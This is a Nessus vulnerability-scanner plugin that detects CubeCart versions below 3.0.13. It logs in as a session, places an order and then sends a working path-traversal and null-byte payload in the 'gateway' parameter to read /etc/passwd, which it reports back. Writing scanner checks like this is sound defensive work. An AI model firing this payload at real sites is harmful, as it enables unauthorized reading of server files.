#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The version of CubeCart installed on the remote host fails to properly
sanitize user-supplied input to the 'gateway' parameter before using
it in the 'includes/content/gateway.inc.php' script to include PHP
code.  An unauthenticated remote attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id. 

In addition, the application fails to initialize the 'searchArray' and
'links' array variables, which could be leveraged to launch SQL
injection and cross-site scripting attacks respectively against the
affected installation as long as PHP's 'register_globals' setting is
enabled. 

See also :

http://www.gulftech.org/?node=research&article_id=00111-08282006&
http://www.cubecart.com/site/forums/index.php?showtopic=21540

Solution :

Either apply the patches referenced in the vendor advisory above or
upgrade to CubeCart version 3.0.13 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22296);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4525", "CVE-2006-4526", "CVE-2006-4527");
  script_bugtraq_id(19782);

  script_name(english:"CubeCart < 3.0.13 Multiple Vulnerabilities");
  script_summary(english:"Tries to read a local file in CubeCart");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cubecart"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # Extract the session cookie as well as a product id.
  pat = 'Set-Cookie: .*(ccSID-.+=[^;]+)';
  cookie = NULL;
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      cookie = eregmatch(pattern:pat, string:match);
      if (!isnull(cookie)) {
        cookie = cookie[1];
        break;
      }
    }
  }

  pat = '\\?act=viewProd&amp;productId=([^"]+)"';
  id = NULL;
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      id = eregmatch(pattern:pat, string:match);
      if (!isnull(id)) {
        id = id[1];
        break;
      }
    }
  }

  # If we have a session cookie and product id...
  if (cookie && id)
  {
    # Place an order.
    postdata = string(
      "add=1"
    );
    req = string(
      "POST ", dir, "/index.php?act=viewProd&productId=", id, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "Cookie: ", cookie, "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # Now try to exploit the flaw to read a file.
    file = "../../../../../../../../../../etc/passwd";
    postdata = string(
      "gateway=", file, "%00"
    );
    req = string(
      "POST ", dir, "/cart.php?act=step5 HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "Cookie: ", cookie, "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(modules/gateway/", file, "\\0/transfer.inc.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(modules/gateway/", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(./modules/gateway/", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "An error");
        if (contents) contents = contents - strstr(contents, "<b");
      }

      if (contents && report_verbosity)
        report = string(
          desc,
          "\n\n",
         "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
